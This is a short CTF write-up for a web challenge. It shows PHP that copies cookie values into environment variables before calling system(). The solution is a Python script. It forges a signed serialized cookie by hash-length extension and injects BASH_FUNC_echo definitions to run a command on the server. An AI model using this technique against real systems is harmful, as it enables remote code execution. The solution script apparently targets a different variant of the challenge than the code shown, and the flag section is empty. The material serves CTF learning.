# TBD

# Finals: Web - Hello_GreyCat_Beta (1000)

Note: This challenge was not blooded during the whole CTF

## Challenge:

```php
<?php
    // Beauty lies in simplicity
    if(isset($_COOKIE['info'])){
        foreach($_COOKIE['info'] as $key => $value) {
            putenv("{$key}={$value}");
        }

        system('echo Hello, $name');
    }

    if(!isset($_COOKIE['info'])) {
        setcookie('info[name]', "GreyCat");
        header("Location: ".$_SERVER["REQUEST_URI"]);
    }
?>
```

## Solution

```python
import hashpumpy
import requests
import urllib.parse

info = b"""O:8:"Greeting":1:{s:14:"\x00Greeting\x00info";a:1:{s:4:"name";s:7:"GreyCat";}}"""
signature = "ac404ceb2667d969d171a2f41dea1c110fd8020ad088237fe53ab293631f93ee"

data_to_add = """|O:8:"Greeting":1:{s:14:"\x00Greeting\x00info";a:3:{s:4:"name";s:7:"GreyCat";s:16:"BASH_FUNC_echo%%";s:10:"() { id; }";s:16:"BASH_FUNC_echo()";s:10:"() { id; }";}}"""
url = "http://34.142.161.21:12321/hello.php"



def figureOutLength():
    for i in range(20,512):
        sig, payload = hashpumpy.hashpump(signature, info, data_to_add, i)
        payload = urllib.parse.quote_plus(payload)
        cookies = {
            "info": payload,
            "signature": sig
        }
        r = requests.get(url, cookies=cookies, allow_redirects=False)

        if(r.cookies['signature'] == signature):
            print('bad')
        else:
            print('good', i)
            print(r.text)
            break
```

## Flag

```

```
